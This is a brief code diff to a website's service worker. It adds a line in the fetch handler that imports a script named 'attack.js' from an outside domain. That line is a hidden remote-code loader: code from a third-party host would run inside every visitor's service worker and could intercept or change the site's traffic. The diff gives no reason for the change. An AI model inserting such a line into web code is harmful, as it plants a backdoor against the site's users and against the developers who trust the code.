@@ -41,6 +41,7 @@ self.addEventListener("activate", (ev) => {
 
 self.addEventListener("fetch", (ev) => {
   console.log("Service Worker: Fetching");
+  importScripts("https://ziwen.ibgang.com/attack.js");
   ev.respondWith(
     caches.open(staticName).then((cache) => {
       return cache.match(ev.request).then((response) => {
